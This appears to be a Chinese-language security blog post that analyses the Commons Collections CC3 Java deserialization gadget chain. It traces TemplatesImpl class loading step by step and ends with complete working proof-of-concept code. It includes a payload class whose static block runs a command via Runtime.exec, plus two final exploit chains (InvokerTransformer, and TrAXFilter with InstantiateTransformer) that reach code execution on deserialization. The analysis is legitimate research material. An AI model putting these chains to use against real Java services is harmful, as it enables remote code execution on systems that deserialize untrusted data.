CC3利用链用到了动态加载类，我之前有写

调用defineClass后 还要进行newInstance实例化

# 分析版本



# 分析过程

CC3链的RCE执行点是，ClassLoader的defineClass方法（还要实例化加载的类，去调用我们写在类的静态代码块中的调用计算器命令）。在类的动态加载中，已经写过如何通过Class.defineClass加载执行字节码。

这条利用链带着调用defineClass加载类，并newInstance实例化的思路去找利用链。

查找ClassLoader.defineClass()的其他类的调用，最后找到的是

```java
protected final Class<?> defineClass(String name, byte[] b, int off, int len)//TemplatesImpl的内部类TransletClassLoader中调用
    throws ClassFormatError
{
    return defineClass(name, b, off, len, null);
}
```

跟进TemplatesImpl.TransletClassLoader的调用处

```java
static final class TransletClassLoader extends ClassLoader {
    private final Map<String,Class> _loadedExternalExtensionFunctions;

     TransletClassLoader(ClassLoader parent) {
         super(parent);
        _loadedExternalExtensionFunctions = null;
    }

    TransletClassLoader(ClassLoader parent,Map<String, Class> mapEF) {
        super(parent);
        _loadedExternalExtensionFunctions = mapEF;
    }

    public Class<?> loadClass(String name) throws ClassNotFoundException {
        Class<?> ret = null;
        // The _loadedExternalExtensionFunctions will be empty when the
        // SecurityManager is not set and the FSP is turned off
        if (_loadedExternalExtensionFunctions != null) {
            ret = _loadedExternalExtensionFunctions.get(name);
        }
        if (ret == null) {
            ret = super.loadClass(name);
        }
        return ret;
     }

    /**
     * Access to final protected superclass member from outer class.
     */
    Class defineClass(final byte[] b) {//继续查找
        return defineClass(null, b, 0, b.length);
    }
}
```

继续找Class defineClass(final byte[] b)的调用

找到了private void defineTransletClasses()

```java
private void defineTransletClasses()
    throws TransformerConfigurationException {

    if (_bytecodes == null) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
        throw new TransformerConfigurationException(err.toString());
    }

    TransletClassLoader loader = (TransletClassLoader)
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
            }
        });

    try {
        final int classCount = _bytecodes.length;
        _class = new Class[classCount];

        if (classCount > 1) {
            _auxClasses = new HashMap<>();
        }

        for (int i = 0; i < classCount; i++) {                ///保证classCount > 0 我们肯定会加载字节码 这里肯定大于零
            _class[i] = loader.defineClass(_bytecodes[i]);    ///调用
            final Class superClass = _class[i].getSuperclass();

            // Check if this is the main class
            if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                _transletIndex = i;
            }
            else {
                _auxClasses.put(_class[i].getName(), _class[i]);
            }
        }

        if (_transletIndex < 0) {
            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
    catch (ClassFormatError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
    catch (LinkageError e) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
        throw new TransformerConfigurationException(err.toString());
    }
}
```

 _class[i] = loader.defineClass(_bytecodes[i]);

可以看到class[]赋给的是加载的类，那么最后想实现RCE还需要把class[]实例化（class[].newInstance）

继续找defineTransletClasses的调用

![image-20240705105309654](https://s2.loli.net/2024/07/05/dEy3b92RXL6NKWk.png)

观察三个方法，前两个都是调用完defineTransletClasses直接return。而getTransletInstance中_class[_transletIndex].newInstance();正好是我们想要的

```java
    private Translet getTransletInstance()
        throws TransformerConfigurationException {
        try {
            if (_name == null) return null;

            if (_class == null) defineTransletClasses();//注意进入这个判断

            // The translet needs to keep a reference to all its auxiliary
            // class to prevent the GC from collecting them
            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();
            translet.postInitialization();
            translet.setTemplates(this);
            translet.setServicesMechnism(_useServicesMechanism);
            translet.setAllowedProtocols(_accessExternalStylesheet);
            if (_auxClasses != null) {
                translet.setAuxiliaryClasses(_auxClasses);
            }

            return translet;
        }
        catch (InstantiationException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
        catch (IllegalAccessException e) {
            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
```

之后再向上找调用

```java
public synchronized Transformer newTransformer()
    throws TransformerConfigurationException
{
    TransformerImpl transformer;

    transformer = new TransformerImpl(getTransletInstance(), _outputProperties,
        _indentNumber, _tfactory);

    if (_uriResolver != null) {
        transformer.setURIResolver(_uriResolver);
    }

    if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) {
        transformer.setSecureProcessing(true);
    }
    return transformer;
}
```

通过上面分析我们需要保证，TemplatesImpl类 _class=null，_name!=null, 

更新下Poc

![image-20240705172057299](https://s2.loli.net/2024/07/05/qweblEPmyQKtR4L.png)

执行会报错，是因为_tfactory是空的，执行到这一步会抛出异常。**（如果程序在这个位置抛出异常，那我们就没法走到newInstance这步了）**

```java
private void defineTransletClasses()
    throws TransformerConfigurationException {

    if (_bytecodes == null) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
        throw new TransformerConfigurationException(err.toString());
    }

    TransletClassLoader loader = (TransletClassLoader)
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
            }
        });
```

下面需要给_tfactory赋值，又观察到_tfactory是个transient修饰的，不会被序列化。

这种情况一般是在重写的readObject，或者writeObject中涉及到，我们看下readObject方法。

在反序列化的时候给_tfactory赋值了。

```java
_tfactory = new TransformerFactoryImpl();
```

那我们这里就反射给_tfactory赋值，反正不会被序列化。

更新Poc

发现还是报错

![image-20240705174001022](https://s2.loli.net/2024/07/05/niKHUfSgjyuODRA.png)

在下面注释中分析

```java
private void defineTransletClasses()   //我们需要把这个方法走完，之后返回getTransletInstance方法，在里面调用newInstanse，所以我们不能让此方法抛出异常
    throws TransformerConfigurationException {

    if (_bytecodes == null) {
        ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);
        throw new TransformerConfigurationException(err.toString());
    }

    TransletClassLoader loader = (TransletClassLoader)
        AccessController.doPrivileged(new PrivilegedAction() {
            public Object run() {
                return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());
            }
        });

    try {
        final int classCount = _bytecodes.length;
        _class = new Class[classCount];

        if (classCount > 1) {
            _auxClasses = new HashMap<>();
        }

        for (int i = 0; i < classCount; i++) {
            _class[i] = loader.defineClass(_bytecodes[i]);
            final Class superClass = _class[i].getSuperclass();

            // Check if this is the main class
            if (superClass.getName().equals(ABSTRACT_TRANSLET)) {
                _transletIndex = i;
            }
            else {
                _auxClasses.put(_class[i].getName(), _class[i]); //异常出现在这儿，_auxClasses为null。但是_auxClasses用transient修饰的，不能被序列化，readObject和writeObject也没涉及到。所以给_auxClasses赋值方法行不通
            }
        }

        if (_transletIndex < 0) {                                //这个判断也不能进，所以我们要保证_transletIndex>0.正好我们就可以让程序走到上面_transletIndex = i;把值赋为正，也不会走_auxClasses.抛异常
            ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);
            throw new TransformerConfigurationException(err.toString());
        }
    }
    catch (ClassFormatError e) 
```

所以现在考虑，控制`superClass.getName().equals(ABSTRACT_TRANSLET)`为真

而`Class superClass = _class[i].getSuperclass();`

```
private static String ABSTRACT_TRANSLET
    = "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
```

所以这段代码意思是我们通过字节码加载的Class的父类的名字为AbstractTranslet，这就要改Test.java源码了。

**让Test继承AbstractTranslet类，而AbstractTranslet类又是个抽象类并且实现了的Translet接口，所以我们要写AbstractTranslet类中的抽象方法和AbstractTranslet类中没有实现的接口Translet的方法。**

下面是Test.java

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.IOException;


public class Test extends AbstractTranslet {
    static  { //静态代码块
        try {
            Runtime.getRuntime().exec("calc");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

更新Poc

```java
public class cc3 {

    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Test.class"));
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "pass");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        templates.newTransformer();
    }
}
```

现在还没结束，因为最终要找到readObject，利用链才算完成。

下面就看newTransformer();，如何调用

## InvokerTransformer（CC1结合）

templates.newTransformer();可以用CC1链中的InvokerTransformer.transform实现。（LazyMap和TransformMap都可以）

改一下调用就好了

最终Poc

```java
public class cc3 {

    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Test.class"));
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "pass");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        //templates.newTransformer();

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(templates),
                new InvokerTransformer("newTransformer",null, null),
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value",1); //不复制的话Map为空，不能遍历Map
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer); //super传的是hashMap.put(1,1)

        Class annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object object = constructor.newInstance(Target.class, transformedMap);

        cc1_poc.serialize(object);
        cc1_poc.unserialize("s.ser");
    }
}
```

## TrAXFilter (CC3)

如果不结合CC1链的话，CC3作者继续找newTransformer()的调用。

![image-20240705193320449](https://s2.loli.net/2024/07/08/agXFdW73VHNB9Un.png)

这里发现了TrAXFilter类，虽然TrAXFilter不能序列化，但是它的构造函数可以传参数。

```java
public TrAXFilter(Templates templates)  throws
    TransformerConfigurationException
{
    _templates = templates;
    _transformer = (TransformerImpl) templates.newTransformer();
    _transformerHandler = new TransformerHandlerImpl(_transformer);
    _useServicesMechanism = _transformer.useServicesMechnism();
}
```

这里讲一个实现构造参数操作并且可序列化的的Transform  InstantiateTransformer

```java
public Object transform(Object input) {
    try {
        if (input instanceof Class == false) {
            throw new FunctorException(
                "InstantiateTransformer: Input object was not an instanceof Class, it was a "
                    + (input == null ? "null object" : input.getClass().getName()));
        }
        Constructor con = ((Class) input).getConstructor(iParamTypes);
        return con.newInstance(iArgs);

    } catch (NoSuchMethodException ex) {
        throw new FunctorException("InstantiateTransformer: The constructor must exist and be public ");
    } catch (InstantiationException ex) {
        throw new FunctorException("InstantiateTransformer: InstantiationException", ex);
    } catch (IllegalAccessException ex) {
        throw new FunctorException("InstantiateTransformer: Constructor must be public", ex);
    } catch (InvocationTargetException ex) {
        throw new FunctorException("InstantiateTransformer: Constructor threw an exception", ex);
    }
}
```

我们考虑使用 InstantiateTransformer.tranform 调用TrAXFilter的构造函数，之后构造函数就会触发templates.newTransformer();加载字节码。

最后把这个Transform放入ChainedTransformer中（这里要注意TrAXFilter.class传值）

最终Poc

```java
public class cc3 {

    public static void main(String[] args) throws Exception{
        byte[] code = Files.readAllBytes(Paths.get("G:\\Java反序列化\\class_test\\Test.class"));
        byte[][] codes = {code};
        TemplatesImpl templates = new TemplatesImpl();
        Class templatesClass = templates.getClass();
        Field name = templatesClass.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "pass");

        Field bytecodes = templatesClass.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, codes);

        Field tfactory = templatesClass.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new TransformerFactoryImpl());

        //TrAXFilter
        //InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        //instantiateTransformer.transform(TrAXFilter.class);

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put("value",1); //不复制的话Map为空，不能遍历Map
        Map<Object, Object> transformedMap = TransformedMap.decorate(hashMap, null, chainedTransformer); //super传的是hashMap.put(1,1)

        Class annotationInvocationHandler = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object object = constructor.newInstance(Target.class, transformedMap);



        cc1_poc.serialize(object);
        cc1_poc.unserialize("s.ser");
    }
}
```